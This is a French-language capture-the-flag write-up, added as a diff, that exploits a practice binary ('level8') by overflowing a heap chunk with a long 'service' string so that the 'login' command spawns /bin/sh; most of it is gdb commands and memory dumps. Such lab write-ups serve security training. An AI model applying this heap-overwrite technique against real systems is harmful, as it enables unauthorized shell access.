@@ -1,0 +1,58 @@
+Ce programme fait un strcmp sur plusieurs mots que l'on peux voir en faisant la commande strigs sur le binaire.
+    -auth : fait un malloc(4)
+    -service : fait un strdup du mot qui lui est associé
+    -reset : free(auth)
+    -login : fait un bin/sh si auth + 32 != 0
+
+il faut donc ecrire dans cette partie de la memoire pour passer ce niveau.
+
+en utilisant gdb nous allons pouvoir observer la heap
+
+    >gdb level8
+    >r
+        (nil), (nil)
+    >auth AAAA
+        0x804a008, (nil)
+    >info proc mappings
+    Mapped address spaces:
+
+Start Addr   End Addr       Size     Offset objfile
+ 0x8048000  0x8049000     0x1000        0x0 /home/user/level8/level8
+ 0x8049000  0x804a000     0x1000        0x0 /home/user/level8/level8
+ 0x804a000  0x806b000    0x21000        0x0 [heap]
+0xb7e2b000 0xb7e2c000     0x1000        0x0
+0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+0xb7fd2000 0xb7fd5000     0x3000        0x0
+0xb7fd9000 0xb7fdd000     0x4000        0x0
+0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+
+grace a cette commande nous avons obtenue l'adresse de la heap qui est en 0x804a000
+
+    >x/20wx 0x804a000
+
+0x804a000:	0x00000000	0x00000011	0x41414141	0x0000000a
+0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
+0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+
+On peut voir l'emplacement ou est stocké auth avec les AAAA qui ont ete saisie.
+
+    >0x804a008, (nil)
+        service BBBBBBBBBBBBBBBB
+
+    >x/20wx 0x804a000
+
+0x804a000:	0x00000000	0x00000011	0x41414141	0x0000000a
+0x804a010:	0x00000000	0x00000019	0x42424220	0x42424242
+0x804a020:	0x42424242	0x42424242	[[0x00000a42]]	0x00020fd9
+0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+
+nous avons bien ecrit dans auth + 32 donc nous pouvons saisir login qui va donc faire un /bin/sh
